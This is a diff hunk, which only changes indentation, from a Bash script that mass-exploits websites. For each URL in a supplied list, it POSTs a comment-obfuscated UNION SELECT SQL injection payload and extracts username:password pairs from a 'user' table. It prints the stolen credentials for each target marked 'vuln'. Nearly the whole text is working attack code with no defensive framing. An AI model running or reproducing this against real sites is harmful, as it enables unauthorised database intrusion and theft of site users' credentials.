@@ -28,14 +28,14 @@ function execute(){
 	#execute SQLi balitbang - thanks to Afrizal for dios and post data
 	for i in $(cat $1); do
 		exe=$(curl -s -X POST ${i} \
-						-d "queryString=exploit%27/**//*!12345uNIoN*//**//*!12345sELEcT*//**/(select+group_concat(%27%3Cresult%3E%27,username,0x3a,password,%27%3C/result%3E%27)+from+user),version()--%20-")
-						if [[ $exe =~ "<result>" ]]; then
-							echo -e "${blue}[${yellow}vuln${blue}]${white} : ${i}"
-							echo -e "${blue}[${yellow}+${blue}] ${yellow}user${white} : "$(echo $exe | grep -o "<result>.*" | cut -d ">" -f2 | cut -d ":" -f1)
-							echo -e "${blue}[${yellow}+${blue}] ${yellow}pass${white} : "$(echo $exe | grep -o "<result>.*" | cut -d ">" -f2 | cut -d ":" -f2 | cut -d "<" -f1)
-						else
-							echo -e "${blue}[${green}not vuln${blue}]${white} : ${i}"
-						fi
+			      -d "queryString=exploit%27/**//*!12345uNIoN*//**//*!12345sELEcT*//**/(select+group_concat(%27%3Cresult%3E%27,username,0x3a,password,%27%3C/result%3E%27)+from+user),version()--%20-")
+			      if [[ $exe =~ "<result>" ]]; then
+				      echo -e "${blue}[${yellow}vuln${blue}]${white} : ${i}"
+				      echo -e "${blue}[${yellow}+${blue}] ${yellow}user${white} : "$(echo $exe | grep -o "<result>.*" | cut -d ">" -f2 | cut -d ":" -f1)
+				      echo -e "${blue}[${yellow}+${blue}] ${yellow}pass${white} : "$(echo $exe | grep -o "<result>.*" | cut -d ">" -f2 | cut -d ":" -f2 | cut -d "<" -f1)
+			      else
+				      echo -e "${blue}[${green}not vuln${blue}]${white} : ${i}"
+			      fi
 	done
 }
 
